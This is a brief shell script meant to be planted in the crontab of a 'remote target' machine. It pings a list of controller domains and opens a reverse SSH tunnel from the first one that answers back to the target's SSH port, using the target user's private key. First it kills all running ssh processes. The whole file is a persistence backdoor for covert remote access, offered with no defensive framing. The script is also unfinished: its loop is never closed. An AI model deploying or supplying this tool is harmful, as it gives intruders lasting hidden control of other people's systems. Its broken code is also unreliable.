#!/bin/sh

# place this script in crontab of remote target, to receive ssh port forwarding connection
# connect to target via local ssh session: ssh -p4040 localhost

killall ssh > /dev/null 2>&1
sleep 6
REMLISTENER=4040
REMUSER=user
HOSTS="domain1.com domain2.com domain3.com"

for LIVEHOST in $HOSTS;
do
	COUNT=$(ping -c2 $LIVEHOST | grep 'received' | awk -F',' '{ print $2 }' | awk '{ print $1 }')
	if [[ $COUNT -gt 0 ]]; then
		ssh -R ${REMLISTENER}:localhost:22 -i "/home/${REMUSER}/.ssh/id_rsa" -N  ${LIVEHOST} -l ${REMUSER}
fi
